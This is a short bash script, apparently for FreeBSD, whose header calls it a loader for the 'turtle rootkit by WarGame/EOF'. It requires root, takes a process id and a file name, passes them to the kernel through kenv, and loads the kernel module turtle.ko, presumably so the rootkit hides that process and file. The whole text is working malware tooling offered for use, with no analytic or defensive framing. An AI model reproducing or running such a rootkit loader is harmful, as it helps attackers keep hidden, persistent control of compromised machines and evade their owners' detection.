#!/usr/local/bin/bash

# simple script to load the turtle rootkit by WarGame/EOF

if [ $EUID -ne 0 ];
then
	echo "You must be root!"
	exit -1
fi

if [ $# -lt 2 ];
then
	echo "Pass pid and file!"
	exit -1
fi

echo "loading turtle with pid=$1 and file=$2"

kenv turtle.pid=$1
kenv turtle.file=$2
kldload module/turtle.ko


